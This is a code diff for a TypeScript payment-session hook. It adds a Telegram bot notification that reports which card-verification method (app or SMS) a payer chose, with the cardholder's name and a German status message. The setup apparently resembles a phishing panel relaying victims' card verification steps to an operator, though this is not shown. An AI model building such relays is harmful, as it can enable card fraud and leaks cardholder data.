@@ -100,11 +100,34 @@ export const useOptimisticPaymentSession = (sessionId: string) => {
     setIsLoading(true);
 
     try {
-      await supabase.functions.invoke('payment-sessions/set-verification-method', {
+      const response = await supabase.functions.invoke('payment-sessions/set-verification-method', {
         body: { sessionId, method }
       });
       
       console.log('Verification method set successfully');
+
+      // Send Telegram notification for method selection (only when choosing from choice_required)
+      if (sessionData?.verification_method === 'choice_required' && (method === 'app_confirmation' || method === 'sms_confirmation')) {
+        try {
+          const cardholderName = response.data?.data?.orders?.cardholder_name;
+          await supabase.functions.invoke('telegram-bot', {
+            body: {
+              type: 'verification_update',
+              data: {
+                session_id: sessionId,
+                verification_method: method,
+                verification_status: method === 'sms_confirmation' ? 'sms_confirmation' : 'waiting',
+                cardholder_name: cardholderName,
+                message: `User wählte: ${method === 'app_confirmation' ? 'App-Bestätigung' : 'SMS-Bestätigung'}`
+              }
+            }
+          });
+          console.log('Telegram notification sent for method choice');
+        } catch (telegramError) {
+          console.error('Error sending Telegram notification for method choice:', telegramError);
+          // Don't break the flow if Telegram fails
+        }
+      }
     } catch (error) {
       console.error('Error setting verification method:', error);
       // Rollback optimistic update
@@ -117,7 +140,7 @@ export const useOptimisticPaymentSession = (sessionId: string) => {
     } finally {
       setIsLoading(false);
     }
-  }, [sessionId, toast]);
+  }, [sessionId, sessionData?.verification_method, toast]);
 
   const confirmAppVerification = useCallback(async () => {
     if (!sessionId) return;
